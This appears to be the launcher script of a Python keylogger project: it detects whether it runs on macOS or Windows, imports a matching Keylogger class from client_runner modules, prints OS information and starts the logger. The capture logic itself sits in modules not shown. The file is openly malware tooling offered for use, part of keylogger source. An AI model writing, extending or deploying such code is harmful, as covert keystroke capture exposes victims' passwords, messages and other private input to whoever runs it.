from pynput.keyboard import Listener
from subprocess import call
import time, datetime
import platform

osName = platform.uname().system
init = None

if osName == "Darwin":
  import client_runner.macOS_runner as macOS_runner
  init = macOS_runner.Keylogger()
elif osName == "Windows":
  import client_runner.Windows_runner as Windows_runner
  init = Windows_runner.Keylogger()

print(init.get_os_info())
init.run()
